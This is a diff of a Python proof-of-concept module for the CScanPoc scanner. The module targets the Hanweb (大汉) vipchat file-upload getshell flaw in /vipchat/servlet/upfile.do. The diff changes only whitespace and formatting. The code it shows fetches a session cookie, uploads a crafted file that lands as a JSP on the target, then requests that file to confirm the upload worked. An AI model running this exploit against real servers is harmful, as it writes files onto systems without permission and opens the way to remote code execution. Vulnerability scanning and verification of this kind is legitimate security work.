@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Hanweb_0003' # 平台漏洞编号，留空
+    vuln_id = 'Hanweb_0003'  # 平台漏洞编号，留空
     name = '大汉网络vipchat上传getshell'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-09-25'  # 漏洞公布时间
     desc = '''
         大汉科技（Hanweb）vipchat /vipchat/servlet/upfile.do 文件上传getshell漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Hanweb(大汉)'  # 漏洞应用名称
     product_version = '大汉网络vipchat'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '56f9b353-008e-4e8e-9563-2500752f9783'
@@ -31,15 +33,15 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-    
-            #refer:http://www.wooyun.org/bugs/wooyun-2015-0143430 
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2015-0143430
             hh = hackhttp.hackhttp()
-            arg = self.target       
+            arg = self.target
             getdata1 = '/vipchat/VerifyCodeServlet?var=clusterid'
             code, head, res, errcode, _ = hh.http(arg + getdata1)
-            m1 = re.search('JSESSIONID=(.*?);',head)
+            m1 = re.search('JSESSIONID=(.*?);', head)
             if m1:
-                if code!= 200:
+                if code != 200:
                     return False
                 raw = """
 POST /vipchat/servlet/upfile.do HTTP/1.1
@@ -75,10 +77,10 @@ just test c4ca4238a0b923820dcc509a6f75849b
                 url = arg + getdata2
                 code, head, res, errcode, _ = hh.http(url, raw=raw)
                 m = re.search('/vipchat/home/info/(.*?).jsp', res)
-                if m :
+                if m:
                     url = arg + m.group(0)
                     code, head, res, errcode, _ = hh.http(url)
-                    if code ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:    
+                    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
                         #security_hole(arg+getdata2+'   :file upload Vulnerable:')
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
@@ -88,6 +90,7 @@ just test c4ca4238a0b923820dcc509a6f75849b
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
